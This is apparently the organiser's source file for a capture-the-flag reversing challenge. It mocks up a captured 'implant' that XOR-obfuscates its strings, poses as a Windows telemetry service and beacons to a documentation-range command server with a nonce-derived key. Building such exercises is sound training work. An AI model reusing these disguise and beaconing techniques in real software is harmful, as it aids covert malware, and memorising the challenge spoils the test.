/* =============================================================================
 *  적 implant 「솔개」  --  노획 검체  (MJSEC 2026 · 작전명 「철책」)
 * -----------------------------------------------------------------------------
 *  [ 출제자 메모 -- 이 .cpp 는 배포하지 않는다. 빌드 산출물(svc_update.exe)만 배포 ]
 *
 *  서사 : 적성국 공작조가 아군 행정망 단말에 BadUSB 를 꽂고 이탈했다.
 *         정보부대 HID 가 장비를 노획 -- 키스트로크 기록(intercept.hid)과
 *         그것이 단말에 심은 implant(이 검체, 코드명 「솔개」)를 확보했다.
 *
 *         「솔개」는 "Windows Telemetry Sync" 서비스로 위장하며, 적 지휘통신소로
 *         정기 보고를 타전한다. 보고에는 그날의 암구호가 인증값으로 실린다.
 *
 *  동작 :
 *    svc_update.exe <auth>
 *      1) 난독화된 보고 채널/위장 정보를 런타임 복원 (1바이트 XOR 0x5A)
 *      2) 1차 비콘 : 지휘소에 접속해 챌린지(nonce)를 수신
 *           - 응답의 Set-Cookie: nonce=<숫자 30자리> 를 파싱
 *           - 받은 챌린지의 형식(길이 30·숫자·규칙)을 검증 (nonce_ok)
 *      3) 보고 인증값 계산 :  key = f(nonce, <auth>)
 *           - nonce 바이트마다 : XOR 암구호 -> rotl3 -> XOR 누산기
 *                                -> 위치항(i*7+1) 가산, 누산기 갱신  => base64
 *      4) 2차 비콘 : Cookie 에 nonce 와 key 를 함께 실어 보고를 타전
 *
 *  핵심(설계 의도):
 *    - 지령(flag)은 이 검체 어디에도 없다. 적 지휘통신소에만 있다.
 *    - 박힌 주소 203.0.113.47 은 RFC5737 TEST-NET-3 -- 죽은 거점(sinkhole).
 *      검체는 1차 비콘부터 막혀 nonce 를 받지 못한다 => f(compute_key) 는
 *      런타임에 실행조차 되지 않는다. 분석관(플레이어)은 f 를 정적 역분석해
 *      직접 재구현하고, 우리가 클론해 세운 지휘소에 위장 접속해야 한다.
 *
 *  빌드 : Visual Studio (v145 toolset, C++20). ws2_32.lib 는 아래 pragma 로 링크.
 * ========================================================================== */

#define _CRT_SECURE_NO_WARNINGS
#define _WIN32_WINNT 0x0A00
#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

/* --- 난독화된 문자열 (각 바이트 ^ 0x5A). 정적 strings 로는 안 보인다. ------ */
static const unsigned char OBF_HOST[] = {
    0x68,0x6a,0x69,0x74,0x6a,0x74,0x6b,0x6b,0x69,0x74,0x6e,0x6d,
};  /* 적 지휘소 주소 "203.0.113.47" (죽은 거점) */
static const unsigned char OBF_PATH[] = {
    0x75,0x3b,0x2a,0x33,0x75,0x2c,0x69,0x75,0x2e,0x3f,0x36,0x3f,0x37,0x3f,
    0x2e,0x28,0x23,
};  /* 보고 채널 "/api/v3/telemetry" */
static const unsigned char OBF_CK[] = {
    0x31,0x3f,0x23,
};  /* 보고 인증값 필드 "key" */
static const unsigned char OBF_NONCE[] = {
    0x34,0x35,0x34,0x39,0x3f,
};  /* 챌린지 필드 "nonce" */
static const unsigned char OBF_SVC[] = {
    0x0d,0x33,0x34,0x3e,0x35,0x2d,0x29,0x7a,0x0e,0x3f,0x36,0x3f,0x37,0x3f,
    0x2e,0x28,0x23,0x7a,0x09,0x23,0x34,0x39,
};  /* 위장 서비스명 "Windows Telemetry Sync" */
static const unsigned char OBF_TAG[] = {
    0x2e,0x36,0x37,0x77,0x3b,0x3d,0x3f,0x34,0x2e,0x75,0x6e,0x74,0x6b,
};  /* 위장 빌드태그 "tlm-agent/4.1" */
static const unsigned char OBF_UA[] = {
    0x17,0x35,0x20,0x33,0x36,0x36,0x3b,0x75,0x6f,0x74,0x6a,0x7a,0x72,0x0d,
    0x33,0x34,0x3e,0x35,0x2d,0x29,0x7a,0x14,0x0e,0x7a,0x6b,0x6a,0x74,0x6a,
    0x61,0x7a,0x0d,0x33,0x34,0x6c,0x6e,0x61,0x7a,0x22,0x6c,0x6e,0x73,0x7a,
    0x1b,0x2a,0x2a,0x36,0x3f,0x0d,0x3f,0x38,0x11,0x33,0x2e,0x75,0x6f,0x69,
    0x6d,0x74,0x69,0x6c,0x7a,0x72,0x11,0x12,0x0e,0x17,0x16,0x76,0x7a,0x36,
    0x33,0x31,0x3f,0x7a,0x1d,0x3f,0x39,0x31,0x35,0x73,0x7a,0x19,0x32,0x28,
    0x35,0x37,0x3f,0x75,0x6b,0x68,0x6b,0x74,0x6a,0x74,0x6a,0x74,0x6a,0x7a,
    0x09,0x3b,0x3c,0x3b,0x28,0x33,0x75,0x6f,0x69,0x6d,0x74,0x69,0x6c,
};  /* 위장 트래픽용 User-Agent (지휘소는 검사하지 않음 -- 디코이) */

#define C2_PORT 8443

/* 1바이트 XOR 복호화 -> NUL 종료 문자열 */
static void deobf(const unsigned char* in, int n, char* out)
{
    for (int i = 0; i < n; i++)
        out[i] = (char)(in[i] ^ 0x5A);
    out[n] = '\0';
}

static const char B64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void b64encode(const unsigned char* in, int n, char* out)
{
    int o = 0;
    for (int i = 0; i < n; i += 3) {
        int rem = n - i;
        unsigned int v = (unsigned int)in[i] << 16;
        if (rem > 1) v |= (unsigned int)in[i + 1] << 8;
        if (rem > 2) v |= (unsigned int)in[i + 2];
        out[o++] = B64[(v >> 18) & 0x3F];
        out[o++] = B64[(v >> 12) & 0x3F];
        out[o++] = (rem > 1) ? B64[(v >> 6) & 0x3F] : '=';
        out[o++] = (rem > 2) ? B64[v & 0x3F] : '=';
    }
    out[o] = '\0';
}

/* 8비트 좌회전 */
static unsigned char rotl8(unsigned char v, int r)
{
    return (unsigned char)((v << r) | (v >> (8 - r)));
}

/* --- 보고 인증값 계산 :  key = f(nonce, auth) ------------------------------
 *   nonce(숫자 30자) 의 각 바이트마다:
 *     XOR 암구호 키스트림 -> rotl 3 -> XOR 누산기 -> 위치항(i*7+1) 가산
 *   누산기(acc)는 직전 결과 바이트로 갱신 -- 앞 바이트가 다음 계산에 영향
 *   (순차 의존). 결과 바이트열을 base64 한 것이 Cookie 의 key 값. */
static void compute_key(const char* nonce, const char* auth, char* out)
{
    unsigned char buf[64];
    int n  = (int)strlen(nonce);
    int al = (int)strlen(auth);
    if (al < 1) al = 1;
    if (n > 64) n = 64;
    unsigned char acc = 0xA7;
    for (int i = 0; i < n; i++) {
        unsigned char x = (unsigned char)nonce[i];
        x ^= (unsigned char)auth[i % al];
        x = rotl8(x, 3);
        x ^= acc;
        x = (unsigned char)(x + (unsigned char)(i * 7 + 1));
        buf[i] = x;
        acc = (unsigned char)(acc + x);
    }
    b64encode(buf, n, out);
}

/* HTTP 응답에서 Set-Cookie 의 nonce 값을 뽑아낸다 */
static int parse_nonce(const char* resp, const char* field, char* out, int cap)
{
    char pat[24];
    sprintf(pat, "%s=", field);              /* "nonce=" */
    const char* p = strstr(resp, pat);
    if (!p) return -1;
    p += strlen(pat);
    int i = 0;
    while (*p && *p != ';' && *p != '\r' && *p != '\n' && i < cap - 1)
        out[i++] = *p++;
    out[i] = '\0';
    return i;
}

/* 챌린지(nonce) 무결성 검증 -- 형식이 어긋난 챌린지는 보고하지 않는다.
   규칙 : 길이 30, 숫자만, 선두 0 금지, 같은 숫자 3연속 금지, 서로 다른 숫자 4종 이상 */
static int nonce_ok(const char* n)
{
    int len = (int)strlen(n);
    if (len != 30) return 0;
    for (int i = 0; i < len; i++)
        if (n[i] < '0' || n[i] > '9') return 0;
    if (n[0] == '0') return 0;
    for (int i = 0; i + 2 < len; i++)
        if (n[i] == n[i + 1] && n[i + 1] == n[i + 2]) return 0;
    int seen[10] = { 0 }, distinct = 0;
    for (int i = 0; i < len; i++) {
        int d = n[i] - '0';
        if (!seen[d]) { seen[d] = 1; distinct++; }
    }
    return distinct >= 4;
}

/* 1.5초 타임아웃 connect (거점이 죽어 있어 어차피 실패) */
static int connect_timed(SOCKET s, struct sockaddr_in* sa, int ms)
{
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);
    connect(s, (struct sockaddr*)sa, (int)sizeof(*sa));

    fd_set wf;
    FD_ZERO(&wf);
    FD_SET(s, &wf);
    struct timeval tv;
    tv.tv_sec = ms / 1000;
    tv.tv_usec = (ms % 1000) * 1000;

    int r = select(0, NULL, &wf, NULL, &tv);
    nb = 0;
    ioctlsocket(s, FIONBIO, &nb);
    return (r == 1) ? 0 : -1;
}

int main(int argc, char** argv)
{
    char svc[32], tag[16];
    deobf(OBF_SVC, (int)sizeof(OBF_SVC), svc);
    deobf(OBF_TAG, (int)sizeof(OBF_TAG), tag);

    if (argc < 2) {
        /* 위장 서비스 배너 -- 평범한 텔레메트리 프로그램인 척 */
        printf("%s [%s]\n", svc, tag);
        printf("usage: %s <auth>\n", argv[0]);
        return 1;
    }

    char host[64], path[64], ua[256], ck[16], noncef[16];
    deobf(OBF_HOST,  (int)sizeof(OBF_HOST),  host);
    deobf(OBF_PATH,  (int)sizeof(OBF_PATH),  path);
    deobf(OBF_UA,    (int)sizeof(OBF_UA),    ua);
    deobf(OBF_CK,    (int)sizeof(OBF_CK),    ck);
    deobf(OBF_NONCE, (int)sizeof(OBF_NONCE), noncef);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] winsock init failed\n");
        return 1;
    }

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, host, &sa.sin_addr);

    int reported = 0;

    /* --- 1차 비콘 : 지휘소에서 챌린지(nonce) 수신 --- */
    char req1[2048];
    sprintf(req1,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n",
        path, host, ua);

    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s != INVALID_SOCKET && connect_timed(s, &sa, 1500) == 0) {
        send(s, req1, (int)strlen(req1), 0);
        char resp1[4096];
        int r = recv(s, resp1, (int)sizeof(resp1) - 1, 0);
        if (r > 0) {
            resp1[r] = '\0';

            char nonce[64];
            if (parse_nonce(resp1, noncef, nonce, (int)sizeof(nonce)) > 0
                && nonce_ok(nonce)) {
                /* --- 챌린지 무결성 OK -> 보고 인증값 계산 : key = f(nonce, 암구호) --- */
                char key[128];
                compute_key(nonce, argv[1], key);

                /* --- 2차 비콘 : nonce 와 key 를 함께 실어 보고 타전 --- */
                char req2[2048];
                sprintf(req2,
                    "GET %s HTTP/1.1\r\n"
                    "Host: %s\r\n"
                    "User-Agent: %s\r\n"
                    "Accept: */*\r\n"
                    "Cookie: %s=%s; %s=%s\r\n"
                    "Connection: close\r\n"
                    "\r\n",
                    path, host, ua, noncef, nonce, ck, key);

                closesocket(s);
                s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s != INVALID_SOCKET && connect_timed(s, &sa, 1500) == 0) {
                    send(s, req2, (int)strlen(req2), 0);
                    char resp2[2048];
                    int r2 = recv(s, resp2, (int)sizeof(resp2) - 1, 0);
                    if (r2 > 0) {
                        resp2[r2] = '\0';
                        printf("%s\n", resp2);
                        reported = 1;
                    }
                }
            }
        }
    }

    if (!reported)
        printf("[!] sync failed: endpoint unreachable\n");

    if (s != INVALID_SOCKET) closesocket(s);
    WSACleanup();
    return 0;
}
